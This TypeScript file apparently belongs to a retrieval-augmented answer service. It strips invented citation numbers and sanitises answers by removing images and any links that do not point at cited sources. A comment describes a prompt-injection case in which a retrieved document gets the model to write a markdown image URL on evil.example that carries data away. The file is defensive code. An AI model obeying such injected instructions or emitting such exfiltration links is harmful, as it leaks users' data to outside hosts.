import type { Citation } from '../db/schema.js';
import type { Source } from './prompt.js';

/**
 * After the answer is complete: which [n] markers point at real sources, in order of first use.
 * Markers for numbers that don't exist (the model made them up) are removed from the text.
 */
export function resolveCitations(answer: string, sources: Source[]) {
  const byNumber = new Map(sources.map((s) => [s.n, s]));
  const used: number[] = [];
  const text = answer.replace(/\[(\d{1,3})\]/g, (marker, digits: string) => {
    const n = Number(digits);
    if (!byNumber.has(n)) return '';
    if (!used.includes(n)) used.push(n);
    return marker;
  });
  const citations: Citation[] = used.map((n) => {
    const { chunkIds: _c, text: _t, ...citation } = byNumber.get(n)!;
    return citation;
  });
  return { text: text.replace(/[ \t]+([.,;:!?])/g, '$1'), citations };
}

/**
 * Fix S1 (data exfiltration through the answer). An injected instruction in a document could make
 * the model write `![](https://evil.example/?data=...)`; a browser rendering that image would send
 * the data away. Before an answer is stored, images are removed entirely and a link survives
 * only if it points at one of the cited sources (otherwise only its text is kept). The web app
 * applies the same rules when rendering, including while the answer is still streaming.
 */
export function sanitizeAnswer(text: string, allowedUrls: string[]): string {
  const allowed = new Set(allowedUrls);
  return text
    .replace(/!\[[^\]]*\]\([^)]*\)/g, '')
    .replace(/<img\b[^>]*>/gi, '')
    .replace(/\[([^\]]+)\]\(([^)\s]+)[^)]*\)/g, (_m, label: string, url: string) =>
      allowed.has(url) ? `[${label}](${url})` : label,
    );
}
